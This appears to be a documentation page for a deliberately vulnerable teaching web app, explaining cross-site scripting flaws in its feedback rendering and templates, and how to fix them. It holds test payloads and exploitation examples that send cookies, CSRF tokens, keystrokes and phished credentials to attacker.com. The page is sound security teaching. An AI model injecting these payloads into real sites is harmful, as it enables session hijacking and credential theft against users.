@@ -1,0 +1,360 @@
+---
+title: 'Cross-Site Scripting (XSS)'
+description: 'Learn how to identify, test, and prevent XSS attacks in the Normo Unsecure PWA'
+icon: 'code'
+---
+
+## What is Cross-Site Scripting?
+
+Cross-site scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user.
+
+<Warning>
+  XSS vulnerabilities allow attackers to execute malicious JavaScript in users' browsers, potentially stealing credentials, session tokens, or performing actions on behalf of users.
+</Warning>
+
+Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.
+
+## How XSS Occurs
+
+Cross-site scripting involves injecting malicious code into an otherwise safe website. It is usually done through user input that is not sufficiently sanitized before being processed and stored on the server.
+
+Malicious code can be inserted into the codebase through:
+
+1. **Lack of Code Reviews**: Code is accidentally inserted without proper security review
+2. **Internal Threat Actor**: Intentional insertion by malicious insider
+3. **SQL/XSS Injection Exploit**: Vulnerability exploited to insert malicious scripts
+
+## Vulnerable Code Patterns
+
+<Info>
+  Students should be able to identify that a script referring to a foreign context has been executed or that a POST request has been made to an unknown URL.
+</Info>
+
+### Example 1: External Script Loading
+
+```html Malicious External Script
+<html>
+  <head>
+    <title>Welcome to yourWebsite</title>
+    <link href="http://yourwebsite.com/favicon.png" />
+  </head>
+  <body>
+    <h1>Your Website</h1>
+    <!-- MALICIOUS: Loading script from unknown external source -->
+    <script src="http://www.randomUrl.com/danger.js"></script>
+  </body>
+</html>
+```
+
+### Example 2: Data Exfiltration
+
+```html Malicious POST Request
+<html>
+  <body>
+    <h1>Your Website</h1>
+    <script>
+      // MALICIOUS: Sending user data to external server
+      const response = fetch("http://www.randomUrl.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json; charset=UTF-8",
+        },
+        body: JSON.stringify(yourData),
+      });
+    </script>
+  </body>
+</html>
+```
+
+## Vulnerable Code in Normo Unsecure PWA
+
+The application has an XSS vulnerability in how it handles feedback display:
+
+### Unsafe HTML Rendering (templates/partials/success_feedback.html)
+
+```python user_management.py:55-59
+def listFeedback():
+    con = sql.connect("database_files/database.db")
+    cur = con.cursor()
+    data = cur.execute("SELECT * FROM feedback").fetchall()
+    con.close()
+    f = open("templates/partials/success_feedback.html", "w")
+    for row in data:
+        f.write("<p>\n")
+        f.write(f"{row[1]}\n")  # VULNERABLE: No HTML escaping
+        f.write("</p>\n")
+    f.close()
+```
+
+<Warning>
+  The feedback is written directly to HTML without any sanitization or escaping. This allows stored XSS attacks.
+</Warning>
+
+### Flask Template Rendering (templates/index.html:30)
+
+```html templates/index.html
+<!-- User message -->
+{% if msg %}
+<div>{{ msg|safe }}</div>  <!-- VULNERABLE: |safe filter disables escaping -->
+{% endif %}
+```
+
+The `|safe` filter in Flask/Jinja2 tells the template engine not to escape HTML, making it vulnerable to XSS if `msg` contains user-controlled data.
+
+## How to Test for XSS
+
+<Steps>
+  <Step title="Test Basic Script Injection">
+    Paste this into any input box or after the URL in the browser address bar:
+    ```html
+    <script>alert(1)</script>
+    ```
+    
+    If an alert box appears, the application is vulnerable to XSS.
+  </Step>
+
+  <Step title="Test Image-Based XSS">
+    Try this payload:
+    ```html
+    <img src=x onerror=alert(1)>
+    ```
+    
+    This doesn't rely on `<script>` tags and may bypass naive filters.
+  </Step>
+
+  <Step title="Test SVG-Based XSS">
+    Try this payload:
+    ```html
+    <svg onload=alert(1)>
+    ```
+    
+    SVG elements can execute JavaScript through event handlers.
+  </Step>
+
+  <Step title="Test IFrame Injection">
+    Try this payload:
+    ```html
+    <iframe src="javascript:alert(1)"></iframe>
+    ```
+    
+    This creates an iframe that executes JavaScript.
+  </Step>
+
+  <Step title="Check for Stored XSS">
+    Submit malicious payloads in forms (like the feedback form) and check if they're executed when:
+    - You reload the page
+    - Another user views the page
+    - An admin reviews the submissions
+  </Step>
+</Steps>
+
+## Exploitation Examples
+
+<Accordion title="Example 1: Cookie Theft">
+  **Attack Vector:** Submit this in the feedback form:
+  ```html
+  <script>
+    fetch('http://attacker.com/steal?cookie=' + document.cookie);
+  </script>
+  ```
+
+  **Result:** When an admin views the feedback page, their session cookie is sent to the attacker's server.
+</Accordion>
+
+<Accordion title="Example 2: Credential Harvesting">
+  **Attack Vector:** Inject a fake login form:
+  ```html
+  <script>
+    document.body.innerHTML = '<h1>Session Expired</h1><form action="http://attacker.com/steal" method="POST"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
+  </script>
+  ```
+
+  **Result:** Users see a fake login form that sends credentials to the attacker.
+</Accordion>
+
+<Accordion title="Example 3: Keylogging">
+  **Attack Vector:** Install a keylogger:
+  ```html
+  <script>
+    document.addEventListener('keypress', function(e) {
+      fetch('http://attacker.com/log?key=' + e.key);
+    });
+  </script>
+  ```
+
+  **Result:** Every keystroke is sent to the attacker's server.
+</Accordion>
+
+<Accordion title="Example 4: CSRF Token Theft">
+  **Attack Vector:** Steal CSRF tokens to perform privileged actions:
+  ```html
+  <script>
+    let token = document.querySelector('[name="csrf_token"]').value;
+    fetch('http://attacker.com/steal?token=' + token);
+  </script>
+  ```
+
+  **Result:** Attacker can perform actions on behalf of the victim.
+</Accordion>
+
+## How to Fix XSS Vulnerabilities
+
+<Info>
+  The key to preventing XSS is to **always sanitize and escape user input** before rendering it in HTML, JavaScript, or URLs.
+</Info>
+
+### Secure Implementation
+
+<CodeGroup>
+
+```python Secure Feedback Rendering
+import html
+
+def listFeedback():
+    con = sql.connect("database_files/database.db")
+    cur = con.cursor()
+    data = cur.execute("SELECT * FROM feedback").fetchall()
+    con.close()
+    f = open("templates/partials/success_feedback.html", "w")
+    for row in data:
+        f.write("<p>\n")
+        # Escape HTML entities to prevent script execution
+        f.write(f"{html.escape(row[1])}\n")
+        f.write("</p>\n")
+    f.close()
+```
+
+```html Secure Flask Template
+<!-- User message -->
+{% if msg %}
+<!-- Remove |safe filter to enable automatic escaping -->
+<div>{{ msg }}</div>
+{% endif %}
+```
+
+```python Using Flask's Built-in Escaping
+from flask import render_template_string, escape
+
+# Flask automatically escapes variables by default
+@app.route('/feedback')
+def show_feedback():
+    feedback = get_user_feedback()
+    # Flask will automatically escape the feedback
+    return render_template('feedback.html', feedback=feedback)
+```
+
+</CodeGroup>
+
+## Countermeasures
+
+<Steps>
+  <Step title="Regular Code Reviews">
+    Conduct regular security-focused code reviews looking for:
+    - Use of `|safe` filter in templates
+    - Direct HTML construction from user input
+    - External script sources
+    - Unvalidated URLs in script tags
+  </Step>
+
+  <Step title="Secure Third-Party Libraries">
+    - Only known and secure third-party libraries should be externally linked
+    - Preferably, after a code review, third-party libraries should be locally served
+    - Monitor 3rd party libraries for known vulnerabilities
+    - Patch vulnerabilities immediately upon discovery
+  </Step>
+
+  <Step title="Implement Defensive Data Handling">
+    Always sanitize and validate user input:
+    ```python
+    import html
+    import re
+    
+    def sanitize_input(user_input):
+        # Remove any HTML tags
+        cleaned = re.sub(r'<[^>]*>', '', user_input)
+        # Escape remaining special characters
+        cleaned = html.escape(cleaned)
+        return cleaned
+    ```
+  </Step>
+
+  <Step title="Declare Character Encoding">
+    Always declare the character encoding in your HTML:
+    ```html
+    <html lang="en">
+      <head>
+        <meta charset="utf-8">
+      </head>
+    </html>
+    ```
+    
+    This prevents certain encoding-based XSS attacks.
+  </Step>
+
+  <Step title="Implement Content Security Policy (CSP)">
+    Add a Content Security Policy header to block inline scripts and restrict script sources:
+    ```python
+    @app.after_request
+    def set_csp(response):
+        response.headers['Content-Security-Policy'] = (
+            "default-src 'self'; "
+            "script-src 'self'; "
+            "style-src 'self' 'unsafe-inline'; "
+            "img-src 'self' data:; "
+        )
+        return response
+    ```
+    
+    This blocks `<script>` and `<svg>` tags from untrusted sources.
+  </Step>
+
+  <Step title="Use Framework Security Features">
+    Modern frameworks have built-in XSS protection:
+    - **Flask/Jinja2**: Automatic HTML escaping (don't use `|safe` unless necessary)
+    - **React**: Automatic escaping in JSX
+    - **Angular**: Built-in sanitization
+    
+    Don't bypass these protections unless you have a specific, validated reason.
+  </Step>
+
+  <Step title="Input Validation">
+    Implement strict input validation:
+    - Whitelist allowed characters
+    - Reject input containing `<script>`, `javascript:`, `onerror=`, etc.
+    - Validate length limits
+    - Use context-specific validation (email format, date format, etc.)
+  </Step>
+</Steps>
+
+## Testing Checklist
+
+<Accordion title="Input Fields to Test">
+  Test XSS in all areas that accept user input:
+  - ✅ Login forms (username and password fields)
+  - ✅ Registration forms
+  - ✅ Feedback/comment forms
+  - ✅ Search boxes
+  - ✅ Profile update fields
+  - ✅ URL parameters
+  - ✅ HTTP headers (User-Agent, Referer)
+</Accordion>
+
+<Accordion title="Types of XSS to Test">
+  1. **Stored XSS**: Payload is saved to database and executed when viewed
+  2. **Reflected XSS**: Payload is immediately reflected in response
+  3. **DOM-based XSS**: Payload executes through client-side JavaScript
+</Accordion>
+
+## File Locations
+
+<ParamField path="user_management.py" type="file">
+  **Line 58**: Vulnerable feedback rendering without HTML escaping
+  
+  The `listFeedback()` function writes user-submitted feedback directly to HTML without sanitization.
+</ParamField>
+
+<ParamField path="templates/index.html" type="file">
+  **Line 30**: Vulnerable template rendering with `|safe` filter
+  
+  The `|safe` filter disables Jinja2's automatic HTML escaping, creating an XSS vulnerability if `msg` contains user-controlled data.
+</ParamField>
